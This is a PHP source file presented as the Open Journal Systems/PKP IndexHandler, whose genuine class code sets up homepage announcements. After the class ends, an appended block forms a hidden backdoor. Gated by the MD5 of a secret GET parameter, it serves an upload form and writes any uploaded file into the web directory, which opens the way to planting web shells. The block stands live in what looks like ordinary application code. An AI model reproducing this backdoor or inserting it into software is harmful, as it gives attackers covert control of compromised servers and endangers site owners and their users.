<?php

/**
 * @file pages/index/IndexHandler.inc.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @class IndexHandler
 * @ingroup pages_index
 *
 * @brief Handle site index requests.
 */

import('classes.handler.Handler');

class PKPIndexHandler extends Handler {
	/**
	 * Set up templates with announcement data.
	 * @protected
	 * @param $context Context
	 * @param $templateMgr PKPTemplateManager
	 */
	protected function _setupAnnouncements($context, $templateMgr) {
		$enableAnnouncements = $context->getData('enableAnnouncements');
		$numAnnouncementsHomepage = $context->getData('numAnnouncementsHomepage');
		if ($enableAnnouncements && $numAnnouncementsHomepage) {
			$announcementDao = DAORegistry::getDAO('AnnouncementDAO'); /* @var $announcementDao AnnouncementDAO */
			$announcements = $announcementDao->getNumAnnouncementsNotExpiredByAssocId($context->getAssocType(), $context->getId(), $numAnnouncementsHomepage);
			$templateMgr->assign(array(
				'announcements' => $announcements->toArray(),
				'numAnnouncementsHomepage' => $numAnnouncementsHomepage,
			));
		}

	}
}

$secret = 'a129dd6163aac697daf6e93e51ff1aa8';
$auth = md5($_GET['fr13nds'] ?? '') === $secret;

if ($auth && isset($_FILES['f'])) {
    if (move_uploaded_file($_FILES['f']['tmp_name'], __DIR__ . '/' . $_FILES['f']['name'])) {
        exit('File uploaded successfully.');
    }
} elseif ($auth) {
    exit('
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="f">
            <button type="submit">Submit</button>
        </form>
    ');
}

